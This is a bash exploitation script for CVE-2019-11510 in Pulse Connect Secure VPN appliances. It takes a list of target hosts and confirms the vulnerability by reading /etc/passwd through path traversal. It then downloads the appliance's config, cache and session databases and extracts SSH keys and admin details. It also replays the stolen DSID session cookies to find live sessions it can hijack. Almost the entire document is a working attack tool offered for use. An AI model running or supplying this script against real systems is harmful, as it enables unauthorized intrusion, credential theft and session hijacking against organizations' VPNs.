#!/bin/bash
#
# Script authored by braindead @tanm-sys
# Based on research by Orange Tsai and Meh Chang:
# https://blog.orange.tw/2019/09/attacking-ssl-vpn-part-3-golden-pulse-secure-rce-chain.html.
# Thanks also to Alyssa Herrera and 0xDezzy for additional insights.
# Huge thanks to bl4ckh0l3z for fixing, cleaning and refactoring the code significantly!
# Huge thanks to tanm-sys for code cleaning

PROGNAME=${0##*/}
target_list=''
is_download=false
is_test_cookies=false
is_ssh_keys=false

DATA_DIR='./DATA'
URL_HOME='dana/home/index.cgi'
URL_DASHBOARD='dana-admin/misc/dashboard.cgi'
URL_VERSION='dana-na/nc/nc_gina_ver.txt'
URL_VULN_CHECK='dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/'
URL_DOWN_CONFIG='dana-na/../dana/html5acc/guacamole/../../../../../../data/runtime/mtmp/system?/dana/html5acc/guacamole/'
URL_DOWN_CACHE='dana-na/../dana/html5acc/guacamole/../../../../../../data/runtime/mtmp/lmdb/dataa/data.mdb?/dana/html5acc/guacamole/'
URL_DOWN_SESSIONS='dana-na/../dana/html5acc/guacamole/../../../../../../data/runtime/mtmp/lmdb/randomVal/data.mdb?/dana/html5acc/guacamole/'

function print_usage {
  cat << EO
  [$PROGNAME by braindead @BishopFox]

  This script extracts private keys, usernames, admin details (including
  session cookies) and observed logins (including passwords) from Pulse
  Connect Secure VPN files downloaded via CVE-2019-11510.

  Usage: $PROGNAME [options]

  Options:
EO
  cat <<EO | column -s\& -t
        -h & show this output
        -t & set the target (IPs - single entry by stdin, in csv format, single column in a file)
        -d & download config, cache and sessions files
        -c & test cookies in order to identify active sessions
        -k & test cookies without downloading files (already downloaded and extracted)
        -s & extract ssh keys
        -a & all tests
EO
  exit
}

function get_opts {
  local OPTIND
  if [[ "$@" == "" ]];then
    print_usage
  else
    while getopts ":ht:dcksa" opt;do
      case ${opt} in
        t ) target_list=$OPTARG
            ;;
        d ) is_download=true
            ;;
        c ) is_test_cookies=true
            is_download=true
            ;;
        k ) is_test_cookies=true            
            ;;
        s ) is_ssh_keys=true
            is_download=true
            ;;
        a ) is_download=true
            is_test_cookies=true
            is_ssh_keys=true
            ;;
        h ) print_usage
            ;;
        \? ) print_usage
            ;;
        : ) echo "Option -$OPTARG requires an argument." >&2
            ;;
      esac
    done
  fi
}

function check_target {
  echo "[#] Checking targets '${target_list}'"  
  if [ -f "${target_list}" ];then
    target_file=${target_list}
    target_list=''
    while read -r line;do
      target_list+="$(echo ${line} | egrep -o "(^([0-9]{1,3}\.){3}[0-9]{1,3}$)|(^[-\.a-zA-Z]+[0-9]*[-\.a-zA-Z]*$)") "
    done < "${target_file}"
  else
    target_list=$(echo ${target_list} | egrep -o "(([0-9]{1,3}\.){3}[0-9]{1,3})|(^[-\.a-zA-Z]+[0-9]*[-\.a-zA-Z]*$)")
  fi
  target_list="$(echo ${target_list} | tr ' ' '\n' | sort -u)"
  if [ "${target_list}" == "" ];then
    echo "  [!] Target empty or unrecognized!"
    exit 1
  else
    target_list_domains=$(echo "${target_list}" | egrep "^[-\.a-zA-Z]+[0-9]*[-\.a-zA-Z]*$")
    for d in $target_list_domains;do
      ip=$(dig +short ${d})
      if [ $(echo "${target_list}" | grep -c "^${ip}$") -ne 0 ];then
        echo "  [!] Discarding '${ip}' because it is already in queue as '${d}'"
        target_list=$(echo "${target_list}" | grep -v "^${ip}$")
      fi
    done
  fi
  echo "  [+] Targets: #$(echo ${target_list} | tr ' ' '\n' | wc -l)" 
  echo "    [+] Done"
}

function write_report {
  target_report_file=$DATA_DIR/$1/${1}_report.txt
  section_name=$2
  data=$3
  is_header=$4
  if [ $is_header == true ];then
    echo "=============================================================================" >> $target_report_file
    echo -e "\t\t\t\t $section_name" >> $target_report_file
    echo "=============================================================================" >> $target_report_file    
  fi
  echo -e "$data" | column -s\& -t >> $target_report_file
  echo >> $target_report_file
}

function extract_product_version {
  target=$1
  echo "  [#] Extracting product version..."
  curl -sk https://${target}/${URL_VERSION} --output $DATA_DIR/$target/${target}_version
  version=$(grep "PARAM NAME=\"ProductVersion\"" $DATA_DIR/$target/${target}_version 2> /dev/null | cut -d\" -f4)
  if [ $(echo $version | egrep -c "^([0-9]+\.)+[0-9]{3,6}$") -eq 1 ];then
    echo "    [+] Pulse Connect Secure: ${version}"
    write_report $target "Pulse Connect Secure version" "${version}" "true"
  else
    echo "    [-] Pulse Connect Secure version is not recognized!"
  fi
}

function check_vulnerable {
  target=$1
  echo "  [#] Check if vulnerable..."
  status=$(curl -skIo /dev/null -w "%{http_code}" --path-as-is https://${target}/${URL_VULN_CHECK})
  check=$(egrep -c '<PARAM NAME="(ProductName|ProductVersion|DownloadPath|DownloadPath64|DisplayName)"' $DATA_DIR/$target/${target}_version)
  if [[ "$status" == "200" && $check -gt 3 ]];then
    echo "    [+] Vulnerable!"
    download_files $target
  else
    echo "    [-] Not vulnerable"
    rm -rf $DATA_DIR/$target/${target}_*
    write_report $target "'$target' exploitation attempt" "Not vulnerable" "true"
  fi
}

function download_files {
  target=$1
  echo "  [#] Downloading files..."
  curl -sk https://${target}/${URL_DOWN_CONFIG} --output $DATA_DIR/$target/${target}_config.zip
  curl -sk https://${target}/${URL_DOWN_CACHE} --output $DATA_DIR/$target/${target}_cache.zip
  curl -sk https://${target}/${URL_DOWN_SESSIONS} --output $DATA_DIR/$target/${target}_sessions.zip
  echo "    [+] Files downloaded"
  unzip_files $target
}

function unzip_files {
  target=$1
  echo "  [#] Unzipping files..."
  unzip -o -q $DATA_DIR/$target/${target}_config.zip -d $DATA_DIR/$target
  unzip -o -q $DATA_DIR/$target/${target}_cache.zip -d $DATA_DIR/$target
  unzip -o -q $DATA_DIR/$target/${target}_sessions.zip -d $DATA_DIR/$target
  rm -f $DATA_DIR/$target/*.zip
  echo "    [+] Files unzipped"
}

function extract_ssh_keys {
  target=$1
  echo "  [#] Extracting SSH keys..."
  if [ -f $DATA_DIR/$target/${target}_sshkeys ];then
    sshkeys=$(cat $DATA_DIR/$target/${target}_sshkeys)
    echo "    [+] SSH keys found:"
    echo "$sshkeys"
    write_report $target "SSH keys" "$sshkeys" "true"
  else
    echo "    [-] SSH keys not found"
  fi
}

function extract_admins {
  target=$1
  echo "  [#] Extracting admin details..."
  if [ -f $DATA_DIR/$target/${target}_admins ];then
    admins=$(cat $DATA_DIR/$target/${target}_admins)
    echo "    [+] Admins found:"
    echo "$admins"
    write_report $target "Admins" "$admins" "true"
  else
    echo "    [-] Admins not found"
  fi
}

function extract_vpn_session_cookies {
  target=$1
  if [[ $is_download == true || $is_test_cookies == true ]];then
    echo "  [#] Extracting VPN session cookies (DSIDs)..."
    if [[ -f $DATA_DIR/$target/${target}_admins && -f $DATA_DIR/$target/${target}_dsids ]];then
      adminuids=( $(while IFS= read -r line;do echo "$line" | cut -d: -f3; done < $DATA_DIR/$target/${target}_admins) )
      data="Value & User\n" 
      if [ $is_test_cookies == true ];then
        echo "    [#] Testing client session cookies..."
        while IFS= read -r line;do
          uid=$(echo "$line" | cut -d: -f2)
          skip=false
          for adminuid in "${adminuids[@]}";do
            if [ "$uid" == "$adminuid" ];then
              skip=true
              break
            fi
          done
          if [ "$skip" == true ];then
            continue
          fi
          cookie=$(echo "$line" | cut -d: -f1)
          status=$(curl -Iks -b "DSID=$cookie" "https://${target}/${URL_HOME}" | head -1 | cut -d ' ' -f2)
          if [ "$status" == "200" ];then
            data+="$cookie & $(echo "$line" | cut -d: -f3)\n"
          fi
        done < $DATA_DIR/$target/${target}_dsids
      else
        data=$(awk '{print $3 " & " $1}' $DATA_DIR/$target/${target}_dsids)
      fi
      write_report $target "VPN Session Cookies (DSIDs)" "$data" "true"
    else
      echo "    [!] Admins or DSIDs file not found. Cannot extract session cookies."
    fi
  else
    echo "  [!] VPN session cookies extraction is disabled."
  fi
}

function main {
  echo "[#] Pulse Connect Secure VPN Exploitation Script"

  get_opts "$@"
  
  if [[ $is_download == true || $is_test_cookies == true ]];then
    echo "[#] Download and test options enabled"
    mkdir -p $DATA_DIR
  fi

  if [ "$target_list" != "" ];then
    check_target
    for target in $target_list;do
      echo "[+] Target: ${target}"
      mkdir -p $DATA_DIR/$target
      extract_product_version $target
      check_vulnerable $target
      if [ $is_ssh_keys == true ];then
        extract_ssh_keys $target
      fi
      if [[ $is_download == true || $is_test_cookies == true ]];then
        extract_admins $target
        extract_vpn_session_cookies $target
      fi
      echo "[+] Done with ${target}"
    done
    echo "[+] All done"
  fi
}

main "$@"
